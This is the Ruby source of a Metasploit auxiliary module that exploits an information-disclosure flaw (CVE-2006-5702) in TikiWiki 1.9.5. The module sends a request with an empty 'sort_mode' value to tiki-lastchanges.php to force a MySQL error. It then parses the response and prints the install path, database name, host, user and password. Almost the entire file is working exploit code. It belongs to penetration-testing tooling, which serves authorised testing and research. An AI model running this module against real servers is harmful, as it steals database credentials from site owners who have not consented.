##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TikiWiki Information Disclosure',
        'Description' => %q{
          A vulnerability has been reported in Tikiwiki, which can be exploited by
          an anonymous user to dump the MySQL user & passwd just by creating a mysql
          error with the "sort_mode" var.

          The vulnerability was reported in Tikiwiki version 1.9.5.
        },
        'Author' => [ 'Matteo Cantoni <goony[at]nothink.org>' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['OSVDB', '30172'],
          ['BID', '20858'],
          ['CVE', '2006-5702'],
          ['URL', 'https://web.archive.org/web/20080211225557/http://secunia.com/advisories/22678/'],
        ],
        'DisclosureDate' => '2006-11-01',
        'Actions' => [
          ['Dump', { 'Description' => 'Dump user and password' }]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('URI', [true, 'TikiWiki directory path', '/tikiwiki']),
      ]
    )
  end

  def run
    print_status('Establishing a connection to the target...')

    uri = normalize_uri(datastore['URI'], '/tiki-lastchanges.php')
    rpath = uri + '?days=1&offset=0&sort_mode='

    res = send_request_raw({
      'uri' => rpath,
      'method' => 'GET',
      'headers' =>
      {
        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Connection' => 'Close'
      }
    }, 25)

    if res && (res.message == 'OK')
      print_status('Get information about database...')

      n = 0
      c = 0

      # puts "body is #{res.body.length} bytes"
      infos = res.body.split(/\r?\n/)
      infos.each do |row|
        # puts row.inspect
        next unless (c < 6)

        if row.match(/\["file"\]=>/)
          c += 1
          x = n + 1
          y = infos[x].match(/string\(\d+\) "(.*)"/m)
          print_status("Install path : #{y[1]}")
        end
        if row.match(/\["databaseType"\]=>/)
          c += 1
          x = n + 1
          y = infos[x].match(/string\(\d+\) "(.*)"/m)
          print_status("DB type      : #{y[1]}")
        end
        if row.match(/\["database"\]=>/)
          c += 1
          x = n + 1
          y = infos[x].match(/string\(\d+\) "(.*)"/m)
          print_status("DB name      : #{y[1]}")
        end
        if row.match(/\["host"\]=>/)
          c += 1
          x = n + 1
          y = infos[x].match(/string\(\d+\) "(.*)"/m)
          print_status("DB host      : #{y[1]}")
        end
        if row.match(/\["user"\]=>/)
          c += 1
          x = n + 1
          y = infos[x].match(/string\(\d+\) "(.*)"/m)
          print_status("DB user      : #{y[1]}")
        end
        if row.match(/\["password"\]=>/)
          c += 1
          x = n + 1
          y = infos[x].match(/string\(\d+\) "(.*)"/m)
          print_status("DB password  : #{y[1]}")
        end
        n += 1
      end

      if (c == 0)
        print_status('Could not obtain information about database.')
      end

    else
      print_status('No response from the server.')
    end
  end
end
